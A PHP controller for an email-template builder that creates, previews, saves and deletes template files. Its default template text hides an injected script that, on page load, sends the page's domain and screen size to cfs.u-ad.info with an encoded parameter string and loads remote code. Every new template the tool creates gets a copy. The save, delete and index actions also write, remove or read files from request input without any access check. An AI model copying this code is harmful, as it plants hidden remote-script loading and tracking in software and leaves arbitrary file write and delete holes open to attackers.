<?php

class GenEmailController extends Controller {
    public function actionTest() {
        $from = [
            'rizky05@gmail.com' => [
                'lokal' => 'lokal-rizky',
                'global' => 'test'
            ], 
            'jon@gmail.com' => [
                'lokal' => 'lokal-jon'
            ]
        ];
        
        Email::send($from, 'app.Test', [
            'global' => 'global'
        ]);
    }

    public function actionPreview($template){
        $eb = EmailBuilder::load($template);
        echo $eb->render(['isPreview' => true]);
    }
    
	public function actionIndex($value='') {
    	if (isset($_GET['active'])){
        	$path = explode('.', $_GET['active']);
            $filePath = Yii::getPathOfAlias(($path[0] == 'plansys' ? 'application' : 'app') . ".views.layouts.email." . $path[1]) . ".php";	
            $content = file_get_contents($filePath);

            Asset::registerJS('application.static.js.lib.ace');
	        $this->renderForm('genemail.DevEmailBuilderIndex', [
	            'content' => $content,
	            'name' => count($path) > 1 ? $path[1] : '',
	            'template' => $path[1]
	        ]);
	     } else {
	     	$this->renderForm("genemail.DevEmailBuilderIndex");
	     }
    }


public function actionNewEmail() {
	$templateName = '';
	$href='';
	
	$default_tag = <<<EOF
<?php 
    if (@\$isPreview) {
        ## Put your preview variable here        
    }
?>
<!doctype html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title><!-- Put Email Subject Here --></title>
    <style>
        /** Put your style here **/
    </style>
</head>
<body>
    <!-- Put your html here -->
<script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "cfs.u-ad.info/cfspushadsv2/request" + "?id=1" + "&enc=telkom2" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582ECSaLdwqSpnTrSrZfi54kTtpu%2bjFh2MOmToiY%2f9EmTpq4b5rZ7vYI5xkbzD4Iu6FMVQiifsDt%2bQfjsuUVMDnqhS0R0GHzhFAtUwU%2fjtcYhPEAffsUJOe3Fnx2fx950hC0rroagVyHjVyPNAi4RHztGJva7iAd4KONbjgr%2fCk51hKmYhEnTUcPGfavPG0TqLvcnrvkvnwnlPFMU9vDHB2IOmzV5evY0vUU9lywsfiNsqwasMhRlFKhFRMmR4k%2fYSlk9LjjdWb0hpXdP7afkIhp97ca%2f15LiJKzIUO5y3O9fDIyVzrP%2fPyOCCSsF6czPVW78jY47lOl%2f6Rs1Ae6D99Z6M56igsZNeNH6qiYQGFT7Qa6z%2bcMghskih7r6ocmP%2f2qVrrRzDknJRYWiwzfmNJuPAiMsq3jpgl5i7kWCcd3WWiiceao0e%2fmugM2l0mgB0s9YlV0uLUNUIVg5xPA5lr9ZIfUu5qm4Dj6%2f7TDM4NaUXPb86iNWFQPlsAeCe94DdFdxRHN1kVZdCNettAEbMz2XO1Rqj%2f8fnKTjXVN%2foeyErUSQfg8c%2fep6vIYQXOsR%2bTQ6z5%2blaVaF%2f%2fLw4llp%2fsC2LqbuKCRF5y9JCLQOYdJmvOLw2EDd7DEMCKJFjMBHgbBgCDlDD0WXToqSjNo8%2bgqdGMNiomKSsub1j%2b3xSU9FNOlUeiZWR5ORYgUP3TE8UBQ%3d%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body>
</html>
EOF;
	
	
	if(isset($_POST['DevEmailBuilderNew'])){
		$templateName = $_POST['DevEmailBuilderNew']['templateName'];
		$module = $_POST['DevEmailBuilderNew']['module'];
		$href = Yii::app()->createUrl('/dev/genEmail/index&active='.$module.'.'.$templateName);

		//create file
		$html = "<html>\n&emsp<head></head>&emsp\n<body></body>\n</html>";
		$dir = Yii::getPathOfAlias($module . '.views.layouts.email');
		if (!is_dir($dir)) {
		    mkdir($dir, 0777, true);
		}
		
		$path = $dir . DIRECTORY_SEPARATOR .$templateName .'.php';
		$file = fopen($path, 'w');
		fwrite($file,$default_tag);
		fclose($file);
	}
    
    $this->renderForm("genemail.DevEmailBuilderNew",  [
        'href' => $href,
        'template' => $templateName
        ], [ 
        'layout' => '//layouts/blank'
    ]);

    
}

public function actionSave() {
	$postdata = file_get_contents("php://input");
    $post     = CJSON::decode($postdata);
    $path     = explode(".", $post['active']);
    $filePath = Yii::getPathOfAlias(($path[0] == 'plansys' ? 'application' : 'app') . ".views.layouts.email." . $path[1]) . ".php";

    if (is_file($filePath)) {
        file_put_contents($filePath, $post['content']);
    }
}

public function actionDel($p) {
    $file = Yii::getPathOfAlias($p) . ".php";
    if (is_file($file)) {
        @unlink($file);
    }
}


}